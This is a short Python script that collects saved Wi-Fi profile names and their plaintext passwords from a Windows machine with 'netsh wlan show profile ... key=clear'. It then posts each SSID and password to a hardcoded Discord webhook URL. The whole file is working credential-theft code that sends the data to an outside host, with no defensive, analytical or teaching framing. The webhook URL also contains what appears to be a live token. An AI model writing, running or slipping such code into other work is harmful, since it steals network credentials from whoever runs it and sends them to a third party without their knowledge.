#!/usr/bin/env python

import subprocess
import re
import requests
import json


url = "https://discord.com/api/webhooks/795938695643004949/ykSa4rrVf3ILQPFRFKlemqGvymCgU4PFMikij4nxNlCCf-NUrsfqrD4XZ1xFa2umDumx"

command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True).decode('utf-8')
names_list = re.findall('(?:Profile\\s*:\\s)(.*)', networks)
result = ""
for name in names_list:
    try:
        command = "netsh wlan show profile " + '"' + name + '"' + " key=clear "
        current_result = subprocess.check_output(command, shell=True).decode('utf-8')
        try:
            ssid_start_index_no = current_result.index('SSID name')
            ssid_name_result = current_result[ssid_start_index_no + 26:]
            ssid_name_end_index = ssid_name_result.index('"')
            ssid_name = ssid_name_result[:ssid_name_end_index]

            password_start_index_no = current_result.index('Key Content')
            password_result = current_result[password_start_index_no +25:]
            password_end_index = password_result.index('Cost settings')
            password = password_result[:password_end_index]

            final_result = f"SSID Name : {ssid_name} \n" + f"Password : {password} " + '\n'

            data = {'content': final_result}
            requests.post(url=url, data=json.dumps(data), headers={'Content-Type': "application/json"})

        except:
            continue
        
    except subprocess.CalledProcessError:
        current_result = "error"

    